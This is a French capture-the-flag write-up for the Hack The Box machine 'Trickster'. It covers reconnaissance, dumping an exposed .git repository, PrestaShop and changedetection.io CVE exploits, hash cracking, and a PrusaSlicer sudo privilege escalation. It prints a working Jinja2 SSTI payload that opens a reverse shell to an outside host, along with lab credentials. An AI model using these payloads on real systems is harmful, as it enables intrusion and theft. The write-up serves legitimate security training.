<!DOCTYPE html>
<html lang="fr" class="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Trickster - Writeup HTB</title>
    <!-- Preload background image -->
    <link rel="preload" href="../../assets/labalsa.jpg" as="image">

    <meta name="description" content="Writeup Hack The Box - Trickster">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../../styles.css">
    <link rel="stylesheet" href="../writeups.css">
    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" defer></script>
</head>

<body class="writeups-mode">
    <nav class="navbar">
        <div class="container">
            <div class="nav-content">
                <a href="../../" class="nav-logo-link">
                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
                        alt="logo signature Rapha√´l">
                </a>
                <div class="nav-links">
                    <a href="../../" class="nav-link">Accueil</a>
                    <a href="../" class="nav-link active">Writeups</a>
                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
                </div>
            </div>
        </div>
    </nav>

    <main class="min-h-screen">
        <div class="writeups-container">
            <a href="../" class="back-link">‚Üê Retour aux writeups</a>
            <div class="writeup-content">
                <header>
                    <h1 class="page-title">Trickster</h1>
                </header>

                <div class="page-body">
                    <h1>User</h1>

                    <p>J'utilise <a href="https://github.com/ygp4ph/yg-scovery" target="_blank" rel="noopener">mon crawler r√©cursif</a> pour la reconnaissance initiale.</p>

                    <pre class="code code-wrap"><code class="language-Bash">~/CTF/HTB/en_cours $ yg-scovery -u http://trickster.htb/   

_____.___.                  _________                                      
\__  |   | ____            /   _____/ ____  _______  __ ___________ ___.__. 
 /   |   |/ ___\   ______  \_____  \_/ ___\/  _ \  \/ // __ \_  __ <   |  | 
 \____   / /_/  > /_____/  /        \  \__(  <_> )   /\  ___/|  | \/\___  | 
 / ______\___  /          /_______  /\___  >____/ \_/  \___  >__|   / ____| 
 \/     /_____/                   \/     \/                \/       \/      v1.0.2
 
[INF] Scanning http://trickster.htb/ (Depth: 3)
[EXT] http://shop.trickster.htb
[EXT] https://html5up.net
[INT] http://trickster.htb/assets/css/main.css
...</code></pre>

                    <p>Un sous-domaine est d√©couvert en mode explicite : <code>shop.trickster.htb</code>. Le fuzzing de r√©pertoires et de sous-domaines (ffuf + subfinder) ne renvoie rien d'autre.</p>

                    <p>Je dois identifier les technologies utilis√©es par le site. Je regarde le header HTTP :</p>

                    <pre class="code code-wrap"><code class="language-Bash">~/CTF/HTB/en_cours $ curl -I http://shop.trickster.htb
HTTP/1.1 200 OK
Date: Wed, 17 Dec 2025 10:38:16 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: PHPSESSID=dinh325a7oubv70aq96lj0eo1i; expires=...
Set-Cookie: PrestaShop-8460c864c88c2f307734ab15f2244f46=...</code></pre>

                    <p>Le <code>robots.txt</code> est rempli d'informations. La premi√®re ligne indique :</p>
                    <pre class="code code-wrap"><code class="language-Bash"># robots.txt automatically generated by PrestaShop e-commerce open-source solution</code></pre>

                    <p>√áa sent la CVE. Je recherche des vuln√©rabilit√©s concernant <code>PrestaShop</code> :</p>

                    <pre class="code code-wrap"><code class="language-Bash">~/CTF/HTB/en_cours $ vulnx id CVE-2024-34716
[CVE-2024-34716] Critical - PrestaShop - Stored XSS
  ‚Ü≥ Priority: HIGH | EXPLOITS AVAILABLE | Vuln Age: 581d
  ‚Ü≥ CVSS: 9.6 | EPSS: 0.3666 | KEV: ‚úò
  ‚Ü≥ Patch: ‚úò | POCs: 3 | Template: ‚úò | HackerOne: ‚úò

Summary üìù
  ‚Ü≥ PrestaShop 8.1.0 to 8.1.5 with customer-thread feature flag enabled contains 
    a reflected cross-site scripting caused by malicious file upload through the 
    contact form...</code></pre>

                    <p>L'exploit demande plusieurs param√®tres, notamment l'admin endpoint. Je fuzze avec common.txt :</p>

                    <pre class="code code-wrap"><code class="language-Bash">/Wordlists $ ffuf -w common.txt.1 -u http://shop.trickster.htb/FUZZ -mc 200,301,302
...
.git/config             [Status: 200, Size: 112, Words: 11, Lines: 8]
.git                    [Status: 301, Size: 323, Words: 20, Lines: 10]
.git/HEAD               [Status: 200, Size: 28, Words: 2, Lines: 2]
.git/index              [Status: 200, Size: 252177, Words: 733, Lines: 978]
.git/logs/              [Status: 200, Size: 1137, Words: 77, Lines: 18]
:: Progress: [4750/4750] :: Job [1/1] :: 325 req/sec :: Duration: [0:00:14] :: Errors: 0 ::</code></pre>

                    <p>Belle d√©couverte : un d√©p√¥t <code>.git</code> est expos√©.</p>

                    <figure class="image">
                        <img src="image.png" alt="Listing du r√©pertoire .git expos√©" style="max-width:100%;">
                    </figure>

                    <p>Je dump le d√©p√¥t Git avec <a href="https://github.com/arthaud/git-dumper" target="_blank" rel="noopener">git-dumper</a> :</p>

                    <pre class="code code-wrap"><code class="language-Bash">git-dumper http://shop.trickster.htb/.git/ ./</code></pre>

                    <p>Le d√©p√¥t contient la structure compl√®te du site. La page admin est √† <code>admin634ewutrx1jgitlooaj</code>.</p>

                    <figure class="image">
                        <img src="image 1.png" alt="Page de connexion admin PrestaShop" style="max-width:100%;">
                    </figure>

                    <p>Maintenant je peux utiliser l'exploit de la CVE :</p>

                    <pre class="code code-wrap"><code class="language-Bash">~/CTF/HTB/en_cours $ ./CVE-2024-34716.sh http://shop.trickster.htb/ /admin634ewutrx1jgitlooaj admin@trickster.htb 10.10.14.31
[*] Ensure Netcat is listening: nc -nvlp 9001
[*] Awaiting netcat listener...
...
[*] Creating PHP reverse shell...
[*] Packaging shell as Love-exploit.zip...
[*] Building HTML payload for CSRF...
[*] Converting HTML to PNG...
[+] CSRF token retrieved: 2474ce65617b3158537cc0eb0cd31c55
[*] Uploading XSS payload to trigger CSRF...</code></pre>

                    <p>Le premier exploit ne fonctionne pas. J'utilise un autre PoC : <a href="https://github.com/aelmokhtar/CVE-2024-34716" target="_blank" rel="noopener">aelmokhtar/CVE-2024-34716</a>.</p>

                    <p>J'ai mon reverse shell. Je cherche maintenant des credentials dans la base de donn√©es. Apr√®s recherche sur <a href="https://devdocs.prestashop-project.org/8/development/configuration/configuring-prestashop/" target="_blank" rel="noopener">la documentation PrestaShop</a>, les fichiers de configuration importants sont :</p>

                    <ul>
                        <li><code>/config/config.inc.php</code></li>
                        <li><code>/config/defines.inc.php</code></li>
                        <li><code>/config/smarty.config.inc.php</code></li>
                        <li><code>/app/config/parameters.php</code></li>
                    </ul>

                    <p>Le dernier contient les informations int√©ressantes :</p>

                    <pre class="code code-wrap"><code class="language-php">www-data@trickster:~/prestashop$ cat app/config/parameters.php
&lt;?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    ...
  ),</code></pre>

                    <p>Je me connecte √† la base de donn√©es et j'explore les tables. La table <code>ps_employee</code> contient :</p>

                    <pre class="code code-wrap"><code class="language-Bash">| 2 | 2 | 0 | james | james | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |...</code></pre>

                    <p>Le hash est du bcrypt. Je le cracke avec hashcat :</p>

                    <pre class="code code-wrap"><code class="language-Bash">~ $ hashcat -m 3200 hash.txt Wordlists/rockyou.txt
...
$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm:alwaysandforever
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))</code></pre>

                    <p>Connexion SSH avec <code>james:alwaysandforever</code> ‚Üí acc√®s utilisateur obtenu.</p>

                    <h1>Root</h1>

                    <p>L'utilisateur james n'a pas de droits sudo. LinPEAS r√©v√®le qu'un Docker tourne sur <code>172.17.0.1</code> et qu'un service √©coute sur <code>127.0.0.1:35835</code>.</p>

                    <p>Je scanne les ports du conteneur Docker :</p>

                    <pre class="code code-wrap"><code class="language-Bash">james@trickster:~$ for port in {22,80,443,3000,5000,8000,8080,9000}; do 
  (echo > /dev/tcp/172.17.0.2/$port) >/dev/null 2>&1 && echo "Port $port ouvert sur 172.17.0.2" & 
done
Port 5000 ouvert sur 172.17.0.2</code></pre>

                    <p>Je curl le port 5000 avec <code>-L</code> pour suivre les redirections :</p>

                    <pre class="code code-wrap"><code class="language-Bash">james@trickster:~$ curl -L 172.17.0.2:5000
...
&lt;title&gt;Change Detection&lt;/title&gt;
...
&lt;div class="sticky-tab" id="right-sticky"&gt;v0.45.20&lt;/div&gt;</code></pre>

                    <p>C'est <a href="https://changedetection.io" target="_blank" rel="noopener">changedetection.io</a>. Je recherche des vuln√©rabilit√©s :</p>

                    <pre class="code code-wrap"><code class="language-Bash">~ $ vulnx id CVE-2024-32651
[CVE-2024-32651] Critical - changedetection.io - Server Side Template Injection
  ‚Ü≥ Priority: URGENT | EXPLOITS AVAILABLE | Vuln Age: 601d
  ‚Ü≥ CVSS: 10.0 | EPSS: 0.9261 (HIGH) | KEV: ‚úò

Summary üìù
  ‚Ü≥ changedetection.io contains a server-side template injection caused by unsafe 
    functions of Jinja2, letting remote attackers execute arbitrary commands...</code></pre>

                    <p>Pour acc√©der au Docker depuis ma machine, je cr√©e un tunnel SSH :</p>

                    <pre class="code code-wrap"><code class="language-Bash">ssh -L 5000:172.17.0.2:5000 james@trickster.htb</code></pre>

                    <p>Je me connecte avec le mot de passe de james (<code>alwaysandforever</code>).</p>

                    <p>Ce payload exploite la capacit√© d'introspection de Python via le moteur de template Jinja2 :</p>

                    <ol>
                        <li><strong>√âvasion du contexte (Sandbox Escape)</strong> : <code>().__class__.__base__.__subclasses__()</code> remonte √† la classe parente <code>object</code> et liste toutes les classes Python charg√©es en m√©moire.</li>
                        <li><strong>Recherche de "Gadget"</strong> : Le script cherche une classe contenant "warning" (souvent <code>warnings.catch_warnings</code>) qui poss√®de des r√©f√©rences vers des modules internes.</li>
                        <li><strong>Ex√©cution de commande (RCE)</strong> : Via <code>__builtins__['__import__']('os').popen(...)</code>.</li>
                    </ol>

                    <p>Payload final :</p>

                    <pre class="code code-wrap"><code class="language-python">{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.31\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read()}}
{% endif %}
{% endfor %}</code></pre>

                    <p>J'ai un reverse shell dans le Docker en tant que root. Cependant, les capabilities ne permettent pas de docker escape (<code>CAP_SYS_ADMIN</code> absent).</p>

                    <p>LinPEAS avait trouv√© le r√©pertoire de donn√©es du Docker. J'exfiltre et analyse les backups :</p>

                    <pre class="code code-wrap"><code class="language-Bash">~/Documents/datastore $ \cat ./dump_v2/b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt
...
'database_user' => 'adam',
'database_password' => 'adam_admin992',
...</code></pre>

                    <p>Mouvement lat√©ral vers <code>adam:adam_admin992</code>.</p>

                    <pre class="code code-wrap"><code class="language-Bash">adam@trickster:~$ sudo -l
User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer</code></pre>

                    <p><a href="https://www.exploit-db.com/exploits/51983" target="_blank" rel="noopener">PrusaSlicer</a> est un logiciel d'impression 3D. On peut lancer un script de post-process apr√®s le slicing qui sera ex√©cut√© en root :</p>

                    <pre class="code code-wrap"><code class="language-Bash">adam@trickster:~$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4777 /tmp/rootbash' > /dev/shm/pwn.sh
adam@trickster:~$ chmod +x /dev/shm/pwn.sh
adam@trickster:~$ cat <<EOF > /dev/shm/cube.obj
v 0.0 0.0 0.0
v 0.0 0.0 1.0
v 0.0 1.0 0.0
v 0.0 1.0 1.0
v 1.0 0.0 0.0
v 1.0 0.0 1.0
v 1.0 1.0 0.0
v 1.0 1.0 1.0
f 1 7 5
f 1 3 7
f 1 4 3
f 1 2 4
f 3 8 7
f 3 4 8
f 5 7 8
f 5 8 6
f 1 5 6
f 1 6 2
f 2 6 8
f 2 8 4
EOF
adam@trickster:~$ sudo /opt/PrusaSlicer/prusaslicer --export-gcode /dev/shm/cube.obj --post-process /dev/shm/pwn.sh
...
Slicing result exported to /dev/shm/cube.gcode
adam@trickster:~$ ls -l /tmp/rootbash
-rwsrwxrwx 1 root root 1396520 Dec 19 21:50 /tmp/rootbash
adam@trickster:~$ /tmp/rootbash -p
rootbash-5.1# cat /root/root.txt</code></pre>

                    <p>Rooted</p>
                </div>
            </div>
        </div>
    </main>
</body>

</html>
